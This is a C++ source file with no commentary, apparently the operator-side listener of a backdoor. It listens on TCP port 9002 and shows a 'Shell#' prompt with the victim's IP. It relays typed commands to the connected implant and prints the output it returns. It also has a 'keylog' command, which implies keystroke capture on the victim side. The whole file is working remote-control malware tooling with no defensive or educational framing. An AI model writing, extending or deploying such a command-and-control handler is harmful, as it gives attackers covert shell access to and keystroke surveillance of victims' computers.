#include <iostream>
#include <string>
#include <cstring>
#include <sys/stat.h>
#include <sys/types.h>

#ifdef _WIN32
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#else
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#endif

int main()
{
    int server_socket, client_socket;
    socklen_t client_len;
    struct sockaddr_in server_address, client_address;
    int optVal = 1;

    char buffer[1024] = {'\0'};
    char total_response[18384] = {'\0'};

#ifdef _WIN32
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0)
    {
        std::cerr << "WSAStartup failed." << std::endl;
        exit(1);
    }
#endif

    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, (char *)&optVal, sizeof(int));

    server_address.sin_family = AF_INET;
    server_address.sin_port = htons(9002);
    server_address.sin_addr.s_addr = INADDR_ANY;

    bind(server_socket, (struct sockaddr *)&server_address, sizeof(server_address));
    listen(server_socket, 5);
    client_len = sizeof(client_address);
    client_socket = accept(server_socket, (struct sockaddr *)&client_address, &client_len);

    while (true)
    {
        start:
        buffer[0] = '\0';
        total_response[0] = '\0';

        std::cout << "* Shell#" << inet_ntoa(client_address.sin_addr) << "$ ";
        fgets(buffer, sizeof(buffer), stdin);
        buffer[strlen(buffer) - 1] = '\0';
        write(client_socket, buffer, sizeof(buffer));
        if (strcmp(buffer, "q") == 0)
        {
            break;
        }
        else if (strcmp(buffer, "keylog") == 0)
        {
            goto start;
        }
        else
        {
            recv(client_socket, total_response, sizeof(total_response), MSG_WAITALL);
            std::cout << total_response << std::endl;
        }
    }

#ifdef _WIN32
    closesocket(server_socket);
    WSACleanup();
#else
    close(server_socket);
#endif

    return 0;
}